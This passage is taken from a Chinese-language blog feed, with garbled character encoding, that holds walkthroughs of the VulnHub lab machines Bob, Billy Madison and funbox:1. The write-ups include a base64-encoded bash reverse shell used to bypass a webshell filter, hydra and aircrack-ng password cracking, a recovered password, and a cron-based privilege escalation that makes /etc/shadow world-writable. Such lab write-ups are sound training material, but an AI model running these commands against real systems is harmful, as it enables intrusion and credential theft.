VERSION<br>80/tcp    open  http    Apache httpd 2.4.25 ((Debian))<br>25468/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u2 (protocol 2.0)<br>MAC Address: 08:00:27:C0:CC:74 (Oracle VirtualBox virtual NIC)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 7.69 seconds<br></code></pre></td></tr></table></figure><p>æŸ¥çœ‹webé¡µé¢ï¼Œå‘ç°åªæ˜¯ä¸€ä¸ªé™æ€é¡µé¢ï¼ŒæŸ¥çœ‹æºç ä¹Ÿæ²¡æœ‰ä»€ä¹ˆå…¶ä»–ä¿¡æ¯ï¼Œç„¶ååœ¨robots.txtä¸­æ‰¾åˆ°äº†ä¸€äº›ä¿¡æ¯<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f50e44fcfb0ee2323690d.png"><br>ä¸€ä¸ªä¸ªè®¿é—®ï¼Œå‘ç°dev_shellæ˜¯ä¸€ä¸ªç®€å•çš„webshellï¼Œå¯ä»¥è¿œç¨‹æ‰§è¡Œæˆ‘ä»¬çš„å‘½ä»¤ï¼Œä½†æ˜¯è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—ï¼Œå¯ä»¥è¯•è¯•base64ç»•è¿‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”Œâ”€â”€(rightevilã‰¿kali)-[~/Desktop]<br>â””â”€$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;/bin/bash -i &gt;&amp; /dev/tcp/192.168.234.130/1234 0&gt;&amp;1&quot;</span> | <span class="hljs-built_in">base64</span>   <br>L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK<br>                                                                                                    <br>â”Œâ”€â”€(rightevilã‰¿kali)-[~/Desktop]<br>â””â”€$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMjM0LjEzMC8xMjM0IDA+JjEK&quot;</span> | <span class="hljs-built_in">base64</span> -d | bash<br></code></pre></td></tr></table></figure><p>å°†ç¬¬äºŒæ¡å‘½ä»¤å¤åˆ¶å»webshellæ‰§è¡Œï¼ŒåŒæ—¶åœ¨æœ¬åœ°å¯åŠ¨ç›‘å¬</p><h1 id="ğŸšªğŸš¶-è·å–æƒé™"><a href="#ğŸšªğŸš¶-è·å–æƒé™" class="headerlink" title="ğŸšªğŸš¶ è·å–æƒé™"></a>ğŸšªğŸš¶ è·å–æƒé™</h1><p>æˆåŠŸåå¼¹åˆ°ä¸€ä¸ªshellï¼Œæˆ‘ä»¬å¯ä»¥ç”¨pythonå°è¯•ä¸€ä¸‹æ‰©å±•ä¸€ä¸ªäº¤äº’æ€§é«˜ä¸€äº›çš„shellï¼ˆå¦‚æœæœ‰pythonçš„è¯ï¼‰</p><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/682c80c1209b9225cff43.png"></p><p>é€šè¿‡æŸ¥æ‰¾ï¼Œæˆ‘ä»¬æ‰¾åˆ°äº†ä¸€ä¸ªå¯†ç æ–‡ä»¶ä»¥åŠä¸€ä¸ªgpgåŠ å¯†çš„æ–‡ä»¶<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1fe839cc4c416c8bfcdba.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/aee07719a02513829fede.png"><br>åœ¨Secretç›®å½•ä¸‹ï¼Œæœ‰ä¸€ä¸ªå¯ä»¥è¿è¡Œçš„è„šæœ¬ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä»–çš„é¦–å­—æ¯æ¥ç»„æˆä¸€ä¸ªå¯†ç <br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3167f62e2e59daaded6df.png"><br>(æ ¹æ®ä¹‹å‰webçš„ä¸€ä¸ªé¡µé¢æ¥çœ‹)<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/9641f18628635ddff83c3.png"><br>ä½†æ˜¯æˆ‘ä»¬æ— æ³•ç”¨www-dataå»è§£å¯†è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘ä»¬ç”¨sshç™»ä¸Šå…¶ä»–ç”¨æˆ·ï¼Œç„¶åå»è§£å¯†</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ gpg -d login.txt.gpg<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6b8fba82a03a28289357c.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/3d2a135613b833a2aa586.png"></p><h1 id="ğŸ›¡ï¸-æå‡æƒé™"><a href="#ğŸ›¡ï¸-æå‡æƒé™" class="headerlink" title="ğŸ›¡ï¸ æå‡æƒé™"></a>ğŸ›¡ï¸ æå‡æƒé™</h1><p>ç„¶åæˆ‘ä»¬ç™»ä¸Šbob</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">seb@Milburg-High:/home/bob/Documents$ su bob<br>Password: <br>bob@Milburg-High:~/Documents$ sudo -l<br>sudo: unable to resolve host Milburg-High<br>[sudo] password <span class="hljs-keyword">for</span> bob: <br>Matching Defaults entries <span class="hljs-keyword">for</span> bob on Milburg-High:<br>    env_reset, mail_badpass,<br>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin<br><br>User bob may run the following commands on Milburg-High:<br>    (ALL : ALL) ALL<br>bob@Milburg-High:~/Documents$ <span class="hljs-built_in">id</span><br>uid=1001(bob) gid=1001(bob) <span class="hljs-built_in">groups</span>=1001(bob),27(sudo)<br></code></pre></td></tr></table></figure><p>å‘ç°æœ‰å¾ˆå¤§çš„sudoæƒé™ï¼Œæˆ‘ä»¬ç›´æ¥ç”¨sudoææƒ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">bob@Milburg-High:~/Documents$ sudo bash<br>sudo: unable to resolve host Milburg-High<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># whoami</span><br>root<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># id</span><br>uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)<br>root@Milburg-High:/home/bob/Documents<span class="hljs-comment"># cd /</span><br>root@Milburg-High:/<span class="hljs-comment"># cat flag.txt </span><br>CONGRATS ON GAINING ROOT<br>        .-.<br>       (   )<br>        |~|       _.--._<br>        |~|~:<span class="hljs-string">&#x27;--~&#x27;</span>      |<br>        | | :   <span class="hljs-comment">#root   |</span><br>        | | :     _.--._|<br>        |~|~`<span class="hljs-string">&#x27;--~&#x27;</span><br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>        | |<br>   _____|_|_________ Thanks <span class="hljs-keyword">for</span> playing ~c0rruptedb1t<br>root@Milburg-High:/<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h1 id="ğŸ“–-æ¨èæ–‡ç« "><a href="#ğŸ“–-æ¨èæ–‡ç« " class="headerlink" title="ğŸ“– æ¨èæ–‡ç« "></a>ğŸ“– æ¨èæ–‡ç« </h1><p><a href="https://www.vulnhub.com/entry/bob-101,226/">Bob 1.0.1ä¸‹è½½</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp Billy Madison</title>
    <link href="/vulnhub-wp-Billy-Madison/"/>
    <url>/vulnhub-wp-Billy-Madison/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ–³-ä¸»æœºå‘ç°"><a href="#ğŸ–³-ä¸»æœºå‘ç°" class="headerlink" title="ğŸ–³ ä¸»æœºå‘ç°"></a>ğŸ–³ ä¸»æœºå‘ç°</h1><p>ç†Ÿæ‚‰çš„netdiscover -r</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">â”€$ sudo netdiscover -r 192.168.234.0/24<br> Currently scanning: Finished!   |   Screen View: Unique Hosts                                <br> 3 Captured ARP Req/Rep packets, from 3 hosts.   Total size: 180                                   <br> _____________________________________________________________________________<br>   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      <br> -----------------------------------------------------------------------------<br> 192.168.234.45  00:0c:29:1f:87:52      1      60  VMware, Inc.                                    <br> 192.168.234.196 20:1e:88:ad:<span class="hljs-built_in">fc</span>:55      1      60  Intel Corporate                                 <br> 192.168.234.177 c6:62:32:b7:68:66      1      60  Unknown vendor  <br></code></pre></td></tr></table></figure><p>ç›®æ ‡æœºå™¨æ˜¯<strong>192.168.134.45</strong></p><h1 id="ğŸ‘-æœåŠ¡æ‰«æ"><a href="#ğŸ‘-æœåŠ¡æ‰«æ" class="headerlink" title="ğŸ‘ æœåŠ¡æ‰«æ"></a>ğŸ‘ æœåŠ¡æ‰«æ</h1><p>ä½¿ç”¨nmapå¯¹å…¶è¿›è¡Œæ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- 192.168.234.45 --min-rate 8000 <br></code></pre></td></tr></table></figure><ul><li>â€“min-rate è®¾ç½®æœ€å°å‘åŒ…é€Ÿåº¦ä¸º8000ï¼Œåœ¨é¶åœºç¯å¢ƒå¯ä»¥å¿«é€Ÿæ‰«æå‡ºç»“æœ<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/c84b44e68c831d5bb6b28.png"></p></blockquote></li></ul><h1 id="ğŸšªğŸš¶-è·å–æƒé™"><a href="#ğŸšªğŸš¶-è·å–æƒé™" class="headerlink" title="ğŸšªğŸš¶ è·å–æƒé™"></a>ğŸšªğŸš¶ è·å–æƒé™</h1><p>ä¸€ä¸ªä¸ªæ¢æµ‹ï¼Œç»è¿‡å°è¯•ï¼ŒsmbæœåŠ¡ä¸­æœ‰ä¸€ä¸ªtxtæ–‡ä»¶ï¼Œé‡Œé¢æç¤ºæˆ‘ä»¬ericçš„åé—¨ä»¥åŠå…³é—­äº†ã€‚</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/41c0b0d2d7080a15873d5.png"></p></blockquote><p>23ç«¯å£ç”¨telnetè¿æ¥åï¼Œç»™äº†æˆ‘ä»¬ä¸€ä¸ªæç¤º</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 23<br>***** HAHAH! You<span class="hljs-string">&#x27;re banned for a while, Billy Boy!</span><br><span class="hljs-string">By the way, I caught you trying to hack my wifi - but the joke&#x27;</span>s on you!<br>I don<span class="hljs-string">&#x27;t use ROTten passwords like rkfpuzrahngvat anymore!</span><br><span class="hljs-string">Madison Hotels is as good as MINE!!!! *****</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œç»™äº†ä¸€ä¸ªrot13åŠ å¯†çš„ä¸€ä¸ªå­—ç¬¦ä¸²</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/997d24edcb9e3cfef5ae6.png"></p></blockquote><p>ç»è¿‡å°è¯•åï¼Œè¿™ä¸ªè§£å¯†åçš„å­—ç¬¦ä¸²æ˜¯ä¸€ä¸ªwebé¡µé¢çš„è·¯å¾„<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/5243bfc663b470d9c8a89.png"><br>ä»è¿™ä¸ªé¡µé¢æˆ‘ä»¬å¯ä»¥å¾—åˆ°çš„ä¿¡æ¯æœ‰ï¼š</p><ul><li>veronicaä½¿ç”¨å¥¹çš„åå­—ä½œä¸ºå¯†ç </li><li>æœ‰ä¸€ä¸ªæµé‡æ–‡ä»¶åœ¨è¿™ä¸ªè·¯å¾„ä¸‹ï¼Œä¹Ÿä½¿ç”¨çš„å’Œveronicaç›¸å…³çš„åå­—</li></ul><p>é‚£æˆ‘ä»¬å…ˆå¾—åˆ°ä¸€ä¸ªå…³äºveronicaçš„å­—å…¸</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span> /usr/share/wordlists/rockyou.txt | grep veronica &gt; pass.txt<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨dirbusterè¿›è¡Œçˆ†ç ´</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4b9c05d1b0f0b5aa6a888.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/45f9abdf33ba98f49b30b.png"></p></blockquote><p>ä»è¿™ä¸ªæµé‡æ–‡ä»¶ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥åˆ†æå‡ºä¿©ä¸ªé‡è¦ä¿¡æ¯</p><ul><li>ericåœ¨æœºå™¨ä¸Šæœ‰ä¸€ä¸ªftpè´¦å·</li><li>è¯¥æœºå™¨çš„ftpä½¿ç”¨äº†knockæœåŠ¡ï¼Œéœ€è¦ä»¥ä¸€ä¸ªç‰¹å®šåºåˆ—è¿›è¡Œâ€æ•²é—¨â€åæ‰ä¼šå¼€æ”¾</li></ul><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/bc03ac5169c435d246ee1.png"><br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e959b7602674464eb0eb.png"><br>æ³¨ï¼š<a href="https://www.cnblogs.com/f-carey/p/16066178.html"><em>knockæœåŠ¡ç§‘æ™®</em></a><br>æ— éœ€å¤šè¨€ï¼Œæˆ‘ä»¬æ•²é—¨<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b2ff23ee2f283b123522e.png"><br>æ³¨ï¼š<strong>è‹¥æ˜¯ç™»å½•ftpçš„æ—¶å€™æŠ¥é”™æœ‰å…³passiveçš„è¯å…ˆè¾“å…¥<code>passive</code>å‘½ä»¤è¿›å…¥passive mode</strong></p><p>ç™»å½•ä¸ŠftpæœåŠ¡å™¨åï¼Œåœ¨ericçš„ç›®å½•ä¸‹æ‰¾åˆ°ä¸€ä¸ª.noteæ–‡ä»¶ï¼Œé‡Œé¢è®°è½½äº†ä¸€ä¸ªåé—¨çš„æ‰“å¼€æ–¹æ³•ï¼Œä»¥åŠericçš„sshå¯†ç åœ¨veronicaæˆ–è€…billyçš„ç›®å½•ä¸‹ã€‚æˆ‘ä»¬çˆ†ç ´ä¸€ä¸‹veronicaçš„ftpè¯•è¯•<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/6f4ea2dfef3d76ccca876.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">hydra -l veronica -P pass.txt 192.168.234.45 ftp<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a8e6e8d7b87302c45e098.png"><br>ç™»å½•ä¸Šveronicaåï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªemlæ–‡ä»¶å’Œä¸€ä¸ªcapæµé‡æ–‡ä»¶ï¼ŒæŠŠä»–ä¸‹è½½ä¸‹æ¥åˆ†æä¸€ä¸‹åå‘ç°æµé‡æ˜¯wifiæµé‡ï¼Œé‚®ä»¶ä¸­ä¹Ÿæåˆ°äº†è¿™ä¸€ç‚¹ã€‚è€Œwifiçš„å¯†ç å°±æ˜¯ericçš„sshå¯†ç <br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b33e1302ba9bb532d6706.png"><br>é‚£æˆ‘ä»¬ç”¨aircrack-ngçˆ†ç ´ä¸€ä¸‹wifiå¯†ç è¯•è¯•</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">aircrack-ng eg-01.cap -w /usr/share/wordlists/rockyou.txt<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/1e955d89673ed3fb7af75.png"><br>åœ¨çˆ†ç ´çš„åŒæ—¶ï¼Œæˆ‘ä»¬ä¹Ÿå‘é€ä¸€ä¸‹é‚®ä»¶ï¼Œæ¿€æ´»åé—¨</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">telnet 192.168.234.45 2525<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/01df918eb7c3f46a0f9b2.png"><br>ç°åœ¨æˆ‘ä»¬å†è¿›è¡Œä¸€ä¸ªnmapæ‰«æï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰æ–°çš„æœåŠ¡å¼€å¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">sudo nmap -p- -sV 192.168.234.45 --min-rate 10000<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/ca57562e6a420ca63a14f.png"><br>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨<strong>eric:triscuit*</strong> å»sshè¿æ¥</p><h1 id="ğŸ›¡ï¸-æå‡æƒé™"><a href="#ğŸ›¡ï¸-æå‡æƒé™" class="headerlink" title="ğŸ›¡ï¸ æå‡æƒé™"></a>ğŸ›¡ï¸ æå‡æƒé™</h1><p>æˆ‘ä»¬åœ¨æœ¬åœ°å¼€å¯pythonçš„webæœåŠ¡ï¼Œç„¶ååœ¨é¶æœºä¸Šç”¨wgetä¸‹è½½è¾…åŠ©ææƒè„šæœ¬</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">kali:<br>python3 -m http.server 80<br><br>eric@BM:/tmp$ wget http://192.168.234.130/linpeas.sh<br>--2023-12-03 06:56:14--  http://192.168.234.130/linpeas.sh<br>Connecting to 192.168.234.130:80... connected.<br>HTTP request sent, awaiting response... 200 OK<br>Length: 847815 (828K) [text/x-sh]<br>Saving to: â€˜linpeas.shâ€™<br><br>linpeas.sh               100%[==================================&gt;] 827.94K  --.-KB/s    <span class="hljs-keyword">in</span> 0.01s   <br><br>2023-12-03 06:56:14 (56.4 MB/s) - â€˜linpeas.shâ€™ saved [847815/847815]<br><br>eric@BM:/tmp$ <span class="hljs-built_in">chmod</span> +x linpeas.sh <br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ä¹‹åï¼Œæˆ‘ä»¬å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªæœ‰è¶£çš„æ–‡ä»¶<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/eaf6f9ff3a060c400420b.png"><br>æˆ‘ä»¬ä»æ•´ä¸ªericçš„æ”»å‡»æµç¨‹å¯ä»¥çŸ¥é“ä»–ä½¿ç”¨äº†ä¸€ä¸ªé’“é±¼çš„æ‰‹æ³•è®©veronicaä¸‹è½½äº†ä¸€ä¸ªæ¶æ„æ–‡ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥æ£€æŸ¥ä¸€ä¸‹è¿™ä¸ªæ–‡ä»¶çš„md5å€¼</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">md5sum</span> /usr/local/share/sgml/donpcgd<br>cd3621324a40c20e54aad9ecef2f6ed5  /usr/local/share/sgml/donpcgd<br></code></pre></td></tr></table></figure><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/4da69d96a6ee138ed0189.png"><br>æˆ‘ä»¬ç”¨googleæœç´¢dgcpnodåå³å¯å‘ç°è¿™ä¸ªexploitçš„åˆ©ç”¨æ–¹æ³•<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a001dcb36c87bcc9eb740.png"><br>è€Œå…·ä½“çš„expå¦‚ä¸‹<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/d8d3433d6f3912a577e06.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">eric@BM:/tmp$ <span class="hljs-built_in">touch</span> /tmp/rootme; <span class="hljs-built_in">chmod</span> +x /tmp/rootme; /usr/local/share/sgml/donpcgd /tmp/rootme /etc/cron.hourly/rootme; <span class="hljs-built_in">echo</span> -e <span class="hljs-string">&#x27;#!/bin/bash \n chmod 777 /etc/shadow&#x27;</span> &gt; /etc/cron.hourly/rootme<br><span class="hljs-comment">#### mknod(/etc/cron.hourly/rootme,81fd,0)</span><br></code></pre></td></tr></table></figure><p>ç„¶åæˆ‘ä»¬å¯ä»¥ç”¨watchå‘½ä»¤ç›‘å¯Ÿ/etc/shadow</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">watch -n 5 <span class="hljs-string">&quot;ls -la /etc/shadow&quot;</span><br></code></pre></td></tr></table></figure><ul><li><code>-n</code> æŒ‡å®šæ¯æ¬¡ç›‘å¯Ÿé—´éš”<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/b056a9c35d4c3ba2ea361.png"><br>è¿™æ—¶æˆ‘ä»¬å°±å¯ä»¥ä¿®æ”¹shadowæ–‡ä»¶æ¥ææƒ(ç¨³å¦¥èµ·è§å¯ä»¥å…ˆå¯¹shadowæ–‡ä»¶è¿›è¡Œå¤‡ä»½ï¼Œä¸ç®¡æ˜¯ä¿®æ”¹shadowæ–‡ä»¶è¿˜æ˜¯passwdæ–‡ä»¶ï¼ŒåŸç†éƒ½æ˜¯ä¸€æ ·çš„)<br>ç¬¬ä¸€æ­¥ï¼šç”Ÿæˆå¯†ç <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">mkpasswd -m sha-512 root <br></code></pre></td></tr></table></figure></li><li><code>-m</code> åŠ å¯†æŒ‡å®šæ¨¡å¼<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/67e9daaeb42036fedf4f6.png"><br>ç¬¬äºŒæ­¥ï¼šå°†åŸæ¥çš„hashå€¼æˆ–è€…x(passwdæ–‡ä»¶)æ›¿æ¢ä¸ºæˆ‘ä»¬ç”Ÿæˆçš„hashå€¼<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/509f5e95160690c1bdcb2.png"><br>è‡³æ­¤ï¼ŒææƒæˆåŠŸï¼Œä½¿ç”¨suåˆ‡æ¢åˆ°rootç”¨æˆ·<br><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/f4f7a281a156d3ae7b58c.png"></li></ul><h1 id="ğŸ“–-æ¨èæ–‡ç« "><a href="#ğŸ“–-æ¨èæ–‡ç« " class="headerlink" title="ğŸ“– æ¨èæ–‡ç« "></a>ğŸ“– æ¨èæ–‡ç« </h1><p><a href="https://www.vulnhub.com/entry/billy-madison-11,161/">Billy Madisonä¸‹è½½</a><br><a href="https://documentation.meraki.com/MX/NAT_and_Port_Forwarding/Active_and_Passive_FTP_Overview_and_Configuration#:~:text=Passive%20FTP%20is%20an%20FTP,the%20connection%20to%20the%20server">ftpçš„passiveæ¨¡å¼</a><br><a href="https://www.youtube.com/watch?v=0gQiv_pkOPw">youtubeè§†é¢‘ wp</a></p>]]></content>
    
    
    <categories>
      
      <category>vulnhub</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vulnhub</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>vulnhub-wp funbox:1</title>
    <link href="/vulnhub-wp-funbox1/"/>
    <url>/vulnhub-wp-funbox1/</url>
    
    <content type="html"><![CDATA[<h1 id="ğŸ”-ä¿¡æ¯æ”¶é›†-Enumeration"><a href="#ğŸ”-ä¿¡æ¯æ”¶é›†-Enumeration" class="headerlink" title="ğŸ” ä¿¡æ¯æ”¶é›†(Enumeration)"></a>ğŸ” ä¿¡æ¯æ”¶é›†(Enumeration)</h1><h2 id="ğŸ–³-ä¸»æœºå‘ç°-Host-Discover"><a href="#ğŸ–³-ä¸»æœºå‘ç°-Host-Discover" class="headerlink" title="ğŸ–³ ä¸»æœºå‘ç°(Host Discover)"></a>ğŸ–³ ä¸»æœºå‘ç°(Host Discover)</h2><p>æˆ‘ä»¬ä½¿ç”¨netdiscoverå‘½ä»¤æ‰«ækaliçš„cæ®µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">netdiscover -r 192.168.61.0/24  <br></code></pre></td></tr></table></figure><ul><li><code>-r</code> æŒ‡å®šç½‘æ®µ<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/7e214193ca77ae6d2758c.png"><br>å‘ç°ç›®æ ‡æœºæ˜¯<em>192.168.61.7</em></p></blockquote><h2 id="ğŸ‘-ç«¯å£æ‰«æ-Port-Scan"><a href="#ğŸ‘-ç«¯å£æ‰«æ-Port-Scan" class="headerlink" title="ğŸ‘ ç«¯å£æ‰«æ(Port Scan)"></a>ğŸ‘ ç«¯å£æ‰«æ(Port Scan)</h2>æˆ‘ä»¬ä½¿ç”¨nmapè¿›è¡Œä¸€ä¸ªå…¨æ‰«æ<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nmap -p- 192.168.61.7 -sV <br></code></pre></td></tr></table></figure></li><li><code>-p-</code> æ‰«æå…¨ç«¯å£  (<em>æ³¨ï¼šè¿™ä¼šäº§ç”Ÿæ¯”è¾ƒå¤§çš„æµé‡</em>)</li><li><code>-sV</code> æ¢æµ‹ç«¯å£æœåŠ¡<blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/e0b912d1bf1022b6b9223.png"><br>å¾—åˆ°ä¸€ä¸ªftpï¼Œsshï¼Œhttpè¿˜æœ‰ä¸€ä¸ªç±»ä¼¼mysqlçš„æœåŠ¡</p></blockquote></li></ul><h2 id="ğŸ•µâ€â™‚-æœåŠ¡æ¢æµ‹-Service-Detection"><a href="#ğŸ•µâ€â™‚-æœåŠ¡æ¢æµ‹-Service-Detection" class="headerlink" title="ğŸ•µâ€â™‚ æœåŠ¡æ¢æµ‹(Service Detection)"></a>ğŸ•µâ€â™‚ æœåŠ¡æ¢æµ‹(Service Detection)</h2><p>æˆ‘ä»¬å…ˆä»æœ€ç®€å•çš„å¼€å§‹ï¼Œhttpï¼Œè®¿é—®ç›®æ ‡çš„80ç«¯å£ã€‚</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/47643d14626051c3c09bd.png"><br>å‘ç°è¢«é‡å®šå‘åˆ°äº†ä¸€ä¸ªæœªçŸ¥çš„urlï¼Œé‚£æˆ‘ä»¬ä¿®æ”¹hostsæ–‡ä»¶æŠŠè¿™ä¸ªurlç»‘å®šåˆ°ç›®æ ‡ipï¼Œç„¶åé‡æ–°è®¿é—®</p></blockquote><p>ç„¶åå‘ç°ç›®æ ‡webçš„cmsæŒ‡çº¹æ˜¯wpï¼Œé‚£ç›´æ¥ä¸Šä¸“ä¸šå·¥å…·</p><blockquote><p><img src="https://c5cc8144.telegraph-image-1ba.pages.dev/file/a54e76bbe009bd9abcdd7.png"></p></blockquote><p>æˆ‘ä»¬ä½¿ç”¨wpscanå¯¹ç›®æ ‡ç½‘ç«™è¿›è¡Œæ‰«æ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">wpscan -e vp,vt,u 